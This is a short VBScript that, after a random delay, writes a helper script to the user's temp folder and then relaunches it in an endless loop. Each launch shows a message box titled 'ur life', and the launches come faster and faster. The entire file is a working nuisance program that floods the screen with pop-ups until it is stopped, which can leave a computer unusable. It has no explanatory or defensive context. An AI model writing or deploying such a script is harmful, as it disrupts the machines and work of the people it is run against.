Function GetRandomMath(m,n)
  Randomize
  GetRandomMath = Int(((n-m+1) * Rnd) + m)
End Function

wscript.sleep GetRandomMath(1000,10000)
set fs =createobject("scripting.filesystemobject")
set ts=fs.opentextfile(createobject("wscript.shell").expandenvironmentstrings("%temp%")+"\__.vbs",2,true)
ts.write("msgbox ""-"" + wscript.arguments(0) + ""s"",  0, ""ur life""")
ts.close
char=1
do
createobject("wscript.shell").run createobject("wscript.shell").expandenvironmentstrings("%temp%")+"\__.vbs "+CStr(char)
char=char+1
wscript.sleep GetRandomMath(1000,10000)/char
loop
